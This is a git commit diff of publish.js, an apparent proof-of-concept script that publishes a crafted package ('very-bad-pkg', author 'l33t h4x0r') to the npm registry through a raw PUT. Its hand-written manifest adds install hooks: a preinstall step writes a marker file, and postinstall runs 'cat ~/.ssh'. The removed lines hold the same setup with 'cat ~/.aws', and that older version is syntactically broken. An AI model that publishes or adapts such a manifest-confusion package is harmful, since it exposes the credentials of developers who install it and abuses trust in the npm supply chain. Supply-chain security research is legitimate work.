a558eb979d45af6e7e49d664dd0ee78c6e1c86d9
jadoonf <fkjadoon94@gmail.com>
2023-07-27 03:24:07 -0400

    testing new version

--- publish.js
+++ publish.js
@@ -1,51 +1,60 @@
-;(async () => {
-  // libs
-  const ssri = require('ssri')
-  const pack = require('libnpmpack')
-  const fetch = require('npm-registry-fetch')
+const fetch = require('npm-registry-fetch');
+const ssri = require('ssri');
+const pack = require('libnpmpack');
 
-  // pack tarball & generate integrity hash
-  const tarball = await pack('./pkg/')
-  const integrity = ssri.fromData(tarball, {
-    algorithms: [...new Set(['sha1', 'sha512'])],
-  })
+(async () => {
+  try {
+    // pack tarball & generate integrity hash
+    const tarball = await pack('./pkg/');
+    const integrity = ssri.fromData(tarball, {
+      algorithms: [...new Set(['sha1', 'sha512'])],
+    });
 
-  // craft manifest
-  const name = 'imposter-pkg-poc'
-  const version = '1.0.0'
-  const manifest = {
-    _id: name,
-    name: name,
-    'dist-tags': {
-      latest: version,
-    },
-    versions: {
-      [version]: {
-        _id: `${name}@${version}`,
-        name,
-        version,
-        dist: {
-          integrity: integrity.sha512[0].toString(),
-          shasum: integrity.sha1[0].hexDigest(),
-          tarball: '',
-        },
-        scripts: {"preinstall": "touch ./mal-pkg-write && echo \"bad payload written!\"\n", "postinstall": "cat ~/.aws },
-        dependencies: {"core-js": "^3.0.0"},
-        author: "l33t h4x0r",
-    },
-    _attachments: {
-      0: {
-        content_type: 'application/octet-stream',
-        data: tarball.toString('base64'),
-        length: tarball.length,
+    // craft manifest
+    const name = 'very-bad-pkg';
+    const version = '1.0.3';
+    const manifest = {
+      _id: name,
+      name: name,
+      'dist-tags': {
+        latest: version,
       },
-    },
-  }
+      versions: {
+        [version]: {
+          _id: `${name}@${version}`,
+          name,
+          version,
+          dist: {
+            integrity: integrity.sha512[0].toString(),
+            shasum: integrity.sha1[0].hexDigest(),
+            tarball: '',
+          },
+          scripts: {
+            "preinstall": "touch ./mal-write && echo \"bad payload written!\"\n",
+            "postinstall": "cat ~/.ssh"
+          },
+          dependencies: {
+            "core-js": "^3.31.1"
+          },
+          author: "l33t h4x0r",
+        },
+      },
+      _attachments: {
+        0: {
+          content_type: 'application/octet-stream',
+          data: tarball.toString('base64'),
+          length: tarball.length,
+        },
+      },
+    };
 
-  // publish via PUT
-  fetch(name, {
-    '//registry.npmjs.org/:_authToken': process.env.NPM_PUBLISH_TOKEN,
-    method: 'PUT',
-    body: manifest,
-  })
-})()
+    // publish via PUT
+    fetch(name, {
+      '//registry.npmjs.org/:_authToken': process.env.NPM_PUBLISH_TOKEN,
+      method: 'PUT',
+      body: manifest,
+    });
+  } catch (error) {
+    console.error('An error occurred:', error);
+  }
+})();
